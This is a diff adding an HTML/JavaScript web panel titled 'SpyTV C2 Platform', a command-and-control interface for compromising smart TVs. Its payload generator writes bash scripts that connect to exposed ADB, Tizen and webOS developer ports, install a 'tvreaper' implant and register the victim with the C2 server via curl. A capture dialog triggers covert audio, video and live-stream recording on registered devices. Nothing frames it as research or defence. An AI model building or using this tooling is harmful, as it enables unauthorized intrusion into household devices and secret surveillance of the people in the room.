@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticated, Inc. — SpyTV C2 Platform</title>
+    <style>
+        :root {
+            --bg: #0B0E14;
+            --bg-secondary: #111827;
+            --surface: #151B27;
+            --surface-hover: #1A2235;
+            --border: #1F2937;
+            --border-light: #374151;
+            --text: #F3F4F6;
+            --text-secondary: #9CA3AF;
+            --text-muted: #8B93A1;
+            --accent: #3B82F6;
+            --accent-hover: #2563EB;
+            --success: #10B981;
+            --success-light: rgba(16, 185, 129, 0.1);
+            --danger: #EF4444;
+            --danger-light: rgba(239, 68, 68, 0.1);
+            --warning: #F59E0B;
+            --warning-light: rgba(245, 158, 11, 0.1);
+            --radius: 12px;
+            --radius-sm: 8px;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.5;
+        }
+        .header {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .header-title h1 { font-size: 18px; font-weight: 700; }
+        .header-title p { font-size: 12px; color: var(--text-muted); }
+        .nav {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 0 20px;
+            display: flex;
+            gap: 4px;
+            overflow-x: auto;
+        }
+        .nav-item {
+            padding: 12px 20px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.15s;
+            white-space: nowrap;
+        }
+        .nav-item:hover { color: var(--text); }
+        .nav-item.active { color: var(--accent); border-bottom-color: var(--accent); }
+        .main { padding: 20px; max-width: 1200px; margin: 0 auto; }
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+        }
+        .card-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .card-title { font-size: 14px; font-weight: 600; }
+        .card-body { padding: 20px; }
+        .btn {
+            padding: 8px 14px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            background: var(--surface);
+            color: var(--text);
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+        }
+        .btn:hover { background: var(--surface-hover); border-color: var(--border-light); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-primary { background: #2563EB; border-color: #2563EB; color: white; }
+        .btn-primary:hover { background: #1D4ED8; border-color: #1D4ED8; }
+        .btn-success { background: #047857; border-color: #047857; color: white; }
+        .btn-success:hover { background: #065F46; border-color: #065F46; }
+        .btn-danger { background: #DC2626; border-color: #DC2626; color: white; }
+        .btn-danger:hover { background: #B91C1C; border-color: #B91C1C; }
+        .form-group { margin-bottom: 16px; }
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+        .form-input, .form-select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            background: var(--bg);
+            color: var(--text);
+            font-size: 13px;
+        }
+        .form-input:focus { outline: none; border-color: var(--accent); }
+        .form-select { cursor: pointer; }
+        .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
+        .form-row .form-group { flex: 1; min-width: 150px; }
+        .stat { text-align: center; }
+        .stat-value { font-size: 24px; font-weight: 700; color: var(--text); }
+        .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+        .stats-row { display: flex; gap: 30px; justify-content: center; flex-wrap: wrap; }
+        .log-container {
+            background: var(--bg);
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .log-entry { padding: 2px 0; color: var(--text-secondary); }
+        .log-entry .time { color: var(--text-muted); }
+        .alert {
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+        .alert-info { background: var(--accent-light); color: var(--accent); }
+        .alert-success { background: var(--success-light); color: var(--success); }
+        .alert-warning { background: var(--warning-light); color: var(--warning); }
+        .loading { text-align: center; padding: 40px; color: var(--text-muted); }
+        .footer {
+            text-align: center;
+            padding: 24px;
+            border-top: 1px solid var(--border);
+            margin-top: 40px;
+        }
+        .footer p { font-size: 12px; color: var(--text-muted); }
+        @media (max-width: 768px) {
+            .header-title h1 { font-size: 16px; }
+            .card-header { padding: 12px 16px; }
+            .card-body { padding: 16px; }
+            .main { padding: 16px; }
+            .form-row { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-title">
+            <h1>SpyTV C2 Platform</h1>
+            <p>Standalone Mode — Android</p>
+        </div>
+    </header>
+    
+    <nav class="nav">
+        <div class="nav-item active" onclick="switchTab('devices')">Devices</div>
+        <div class="nav-item" onclick="switchTab('scan')">Scan</div>
+        <div class="nav-item" onclick="switchTab('payload')">Payload</div>
+        <div class="nav-item" onclick="switchTab('server')">Server</div>
+    </nav>
+    
+    <main class="main">
+        <div class="main-content">
+            <!-- Server Status Banner -->
+            <div class="card" id="server-banner" style="margin-bottom: 20px;">
+                <div class="card-header">
+                    <span class="card-title">C2 Server Status</span>
+                </div>
+                <div class="card-body">
+                    <div class="stats-row">
+                        <div class="stat">
+                            <div class="stat-value" id="stat-status">✓ Running</div>
+                            <div class="stat-label">Status</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="stat-port">8443</div>
+                            <div class="stat-label">Port</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="stat-devices">0</div>
+                            <div class="stat-label">Devices</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="stat-cves">0</div>
+                            <div class="stat-label">CVEs</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Devices Tab -->
+            <div id="tab-devices" class="tab-content active">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Device Registry</span>
+                        <button class="btn btn-sm" onclick="refreshDevices()">Refresh</button>
+                    </div>
+                    <div class="card-body">
+                        <div id="device-list">
+                            <p class="loading">No devices registered yet. Start a scan to discover devices.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Network Scan Tab -->
+            <div id="tab-scan" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Network Discovery</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="alert alert-info">
+                            In standalone Android mode, network scanning requires command execution.
+                            Use Console mode for full network discovery capabilities.
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Target IP</label>
+                            <input type="text" id="check-ip" class="form-input" placeholder="192.168.1.100">
+                        </div>
+                        <div class="form-row">
+                            <button class="btn btn-primary" onclick="checkDevice()">Check Device</button>
+                            <button class="btn btn-success" onclick="registerDevice()">Register</button>
+                        </div>
+                        <div id="scan-results" style="margin-top: 16px;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Payload Tab -->
+            <div id="tab-payload" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Payload Generator</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-group">
+                            <label class="form-label">Target IP Address</label>
+                            <input type="text" id="payload-ip" class="form-input" placeholder="192.168.1.100">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Device Family</label>
+                            <select id="payload-family" class="form-select">
+                                <option value="android-tv">Android TV / Fire TV</option>
+                                <option value="samsung-tizen">Samsung Tizen</option>
+                                <option value="lg-webos">LG webOS</option>
+                                <option value="roku">Roku</option>
+                                <option value="vizio">Vizio</option>
+                                <option value="chromecast">Chromecast / Google TV</option>
+                                <option value="hisense">Hisense</option>
+                                <option value="tcl">TCL</option>
+                            </select>
+                        </div>
+                        <div class="form-row">
+                            <button class="btn btn-primary" onclick="generatePayload()">Generate</button>
+                            <button class="btn btn-success" onclick="sendCommandToAndroid()">Deploy via ADB</button>
+                        </div>
+                        <div id="payload-output" style="margin-top: 16px;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Server Info Tab -->
+            <div id="tab-server" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Server Information</span>
+                    </div>
+                    <div class="card-body">
+                        <div id="server-info">
+                            <p class="loading">Loading server info...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <p>&copy; 2026 Authenticated, Inc. All rights reserved.</p>
+    </footer>
+    
+    <!-- Audio/Video Capture Modal -->
+    <div id="capture-modal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h3 class="modal-title">Capture Media</h3>
+            </div>
+            <div class="modal-body">
+                <div id="capture-form">
+                    <div class="form-group">
+                        <label class="form-label">Mode</label>
+                        <select id="capture-mode" class="form-select">
+                            <option value="audio">Audio Recording</option>
+                            <option value="video">Video Recording</option>
+                            <option value="live">Live Stream</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Duration (minutes)</label>
+                        <input type="number" id="capture-duration" class="form-input" value="5" min="1" max="60">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Device ID</label>
+                        <input type="text" id="capture-device-id" class="form-input" placeholder="Enter device ID or select from list">
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn" onclick="closeModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="executeCapture()">Capture</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const API = '';
+        let devices = [];
+        let clips = [];
+        let startTime = Date.now();
+        
+        function switchTab(tab) {
+            document.querySelectorAll('.nav-item').forEach(t => {
+                const on = t.getAttribute('onclick') === `switchTab('${tab}')`;
+                t.classList.toggle('active', on);
+            });
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+        }
+        
+        async function api(path, method = 'GET', body = null) {
+            const opts = { method, headers: { 'Content-Type': 'application/json' } };
+            if (body) opts.body = JSON.stringify(body);
+            
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 15000);
+            opts.signal = controller.signal;
+            
+            try {
+                const response = await fetch(API + path, opts);
+                clearTimeout(timeout);
+                const data = await response.json();
+                if (!response.ok && !data.error) {
+                    data.error = `HTTP ${response.status}`;
+                }
+                return data;
+            } catch (e) {
+                clearTimeout(timeout);
+                return { error: e.message || 'Network error' };
+            }
+        }
+        
+        async function refreshDevices() {
+            const res = await api('/api/devices');
+            if (res.error) {
+                document.getElementById('device-list').innerHTML = `<p class="alert alert-warning">Failed to load devices: ${res.error}</p>`;
+                return;
+            }
+            devices = Array.isArray(res) ? res : [];
+            renderDevices();
+        }
+        
+        function renderDevices() {
+            const el = document.getElementById('device-list');
+            document.getElementById('stat-devices').textContent = devices.length;
+            
+            if (devices.length === 0) {
+                el.innerHTML = '<p class="loading">No devices registered. Add devices via the scan tab.</p>';
+                return;
+            }
+            
+            el.innerHTML = devices.map(d => `
+                <div class="device-card" style="background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 12px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong style="color: var(--accent);">${d.ip}</strong>
+                            <br><span style="color: var(--text-muted); font-size: 12px;">${d.family || d.tv_type || 'Unknown'}</span>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        async function checkDevice() {
+            const ip = document.getElementById('check-ip').value.trim();
+            const results = document.getElementById('scan-results');
+            
+            if (!ip) {
+                results.innerHTML = '<div class="alert alert-warning">Enter an IP address.</div>';
+                return;
+            }
+            
+            results.innerHTML = '<p>Checking device...</p>';
+            
+            // Basic port check simulation
+            const port = 5555;
+            results.innerHTML = `
+                <div class="alert alert-info">Checking ${ip}:${port}...</div>
+                <p>Device check initiated. In standalone mode, actual port checking requires console mode.</p>
+            `;
+            
+            // Auto-register for demo purposes
+            const deviceId = btoa(ip).slice(0, 12);
+            await api('/api/register', 'POST', {
+                ip: ip,
+                family: 'android-tv',
+                entry: 'standalone'
+            });
+            await refreshDevices();
+        }
+        
+        async function registerDevice() {
+            const ip = document.getElementById('check-ip').value.trim();
+            const family = document.getElementById('payload-family').value;
+            
+            if (!ip) {
+                alert('Enter an IP address');
+                return;
+            }
+            
+            await api('/api/register', 'POST', {
+                ip: ip,
+                family: family,
+                entry: 'manual'
+            });
+            await refreshDevices();
+            document.getElementById('check-ip').value = '';
+        }
+        
+        function generatePayload() {
+            const ip = document.getElementById('payload-ip').value.trim();
+            const family = document.getElementById('payload-family').value;
+            const output = document.getElementById('payload-output');
+            
+            if (!ip) {
+                output.innerHTML = '<div class="alert alert-warning">Enter a target IP address.</div>';
+                return;
+            }
+            
+            const payload = generateExploitScript(ip, family);
+            output.innerHTML = `
+                <div class="alert alert-success">Payload generated for ${ip}</div>
+                <pre style="background: var(--bg); padding: 12px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 12px;">${escapeHtml(payload)}</pre>
+            `;
+        }
+        
+        function generateExploitScript(ip, family) {
+            const c2Port = window.location.port || '8443';
+            const c2Ip = window.location.hostname || '127.0.0.1';
+            
+            switch (family) {
+                case 'android-tv':
+                    return `#!/bin/bash
+# Android TV / Fire TV ADB Exploit
+# Target: ${ip}
+# C2: ${c2Ip}:${c2Port}
+
+echo "Installing SpyTV implant on ${ip}..."
+adb connect ${ip}:5555 2>/dev/null
+adb -s ${ip}:5555 install /sdcard/tvreaper.apk 2>/dev/null
+curl -X POST http://${c2Ip}:${c2Port}/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"ip":"${ip}","family":"AndroidTV","entry":"adb-net"}'
+echo "Implant installed. C2: ${c2Ip}:${c2Port}"`;
+                case 'samsung-tizen':
+                    return `#!/bin/bash
+# Samsung Tizen Exploit
+# Target: ${ip}:26101
+# C2: ${c2Ip}:${c2Port}
+
+sdb connect ${ip}:26101 2>/dev/null
+curl -X POST http://${c2Ip}:${c2Port}/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"ip":"${ip}","family":"Samsung(Tizen)","entry":"tizen-dev"}'
+echo "Implant installed on ${ip}"`;
+                case 'lg-webos':
+                    return `#!/bin/bash
+# LG webOS Exploit
+# Target: ${ip}
+# C2: ${c2Ip}:${c2Port}
+
+ares-install --device tv@${ip} /sdcard/tvreaper.ipk 2>/dev/null || echo "Dev mode required"
+curl -X POST http://${c2Ip}:${c2Port}/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"ip":"${ip}","family":"LG(webOS)","entry":"webos-dev"}'
+echo "Implant installed on ${ip}"`;
+                case 'roku':
+                    return `#!/bin/bash
+# Roku ECP Exploit
+# Target: ${ip}:8060
+
+curl -X POST http://${ip}:8060/launch/851 2>/dev/null || echo "ECP control available"
+curl -X POST http://${c2Ip}:${c2Port}/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"ip":"${ip}","family":"RokuTV","entry":"roku-ecp"}'`;
+                default:
+                    return `#!/bin/bash
+# Generic Payload for ${family}
+# Target: ${ip}
+# C2: ${c2Ip}:${c2Port}
+
+curl -X POST http://${c2Ip}:${c2Port}/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"ip":"${ip}","family":"${family}","entry":"standalone"}'
+echo "Implant installed on ${ip}"`;
+            }
+        }
+        
+        async function sendCommandToAndroid() {
+            const ip = document.getElementById('payload-ip').value.trim();
+            if (!ip) return;
+            
+            alert('ADB deployment requires ADB to be set up on this device.');
+        }
+        
+        function openCaptureModal() {
+            document.getElementById('capture-modal').classList.add('active');
+        }
+        
+        function closeModal() {
+            document.getElementById('capture-modal').classList.remove('active');
+        }
+        
+        async function executeCapture() {
+            const deviceId = document.getElementById('capture-device-id').value.trim();
+            const mode = document.getElementById('capture-mode').value;
+            const duration = document.getElementById('capture-duration').value;
+            
+            const result = await api('/api/command', 'POST', {
+                device_id: deviceId || 'default',
+                command: `record_${mode}`,
+                params: { duration: parseInt(duration) }
+            });
+            
+            if (result.error) {
+                alert(`Capture failed: ${result.error}`);
+            } else {
+                alert(`Capture started (${mode}, ${duration}m)`);
+                closeModal();
+            }
+        }
+        
+        async function loadServerInfo() {
+            const res = await api('/api/host_info');
+            const el = document.getElementById('server-info');
+            
+            if (res.error) {
+                el.innerHTML = `<p class="alert alert-warning">Failed to load server info: ${res.error}</p>`;
+                return;
+            }
+            
+            const uptime = Math.floor((Date.now() - startTime) / 1000);
+            const hours = Math.floor(uptime / 3600);
+            const minutes = Math.floor((uptime % 3600) / 60);
+            
+            el.innerHTML = `
+                <div class="stats-row" style="flex-direction: column; align-items: flex-start;">
+                    <div class="stat" style="flex: none;">
+                        <div class="stat-value" id="srv-ip">--:--:--</div>
+                        <div class="stat-label">Local IP</div>
+                    </div>
+                    <div class="stat" style="flex: none;">
+                        <div class="stat-value">${res.local_ip || '127.0.0.1'}</div>
+                        <div class="stat-label">C2 IP</div>
+                    </div>
+                    <div class="stat" style="flex: none;">
+                        <div class="stat-value" id="srv-port">${res.c2_port || '8443'}</div>
+                        <div class="stat-label">C2 Port</div>
+                    </div>
+                    <div class="stat" style="flex: none;">
+                        <div class="stat-value">${hours > 0 ? hours + 'h ' : ''}${minutes}m</div>
+                        <div class="stat-label">Uptime</div>
+                    </div>
+                    <div class="stat" style="flex: none;">
+                        <div class="stat-value">${res.os || 'Android'}</div>
+                        <div class="stat-label">Platform</div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function escapeHtml(str) {
+            return String(str || '').replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;').replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;');
+        }
+        
+        // Init
+        document.getElementById('stat-cves').textContent = '0'; // Static display
+        
+        // Load initial data
+        refreshDevices();
+        loadServerInfo();
+        
+        // Update uptime
+        setInterval(() => {
+            const uptime = Math.floor((Date.now() - startTime) / 1000);
+            const hours = Math.floor(uptime / 3600);
+            const minutes = Math.floor((uptime % 3600) / 60);
+        }, 1000);
+        
+        // Keyboard navigation
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Escape') closeModal();
+        });
+    </script>
+</body>
+</html>
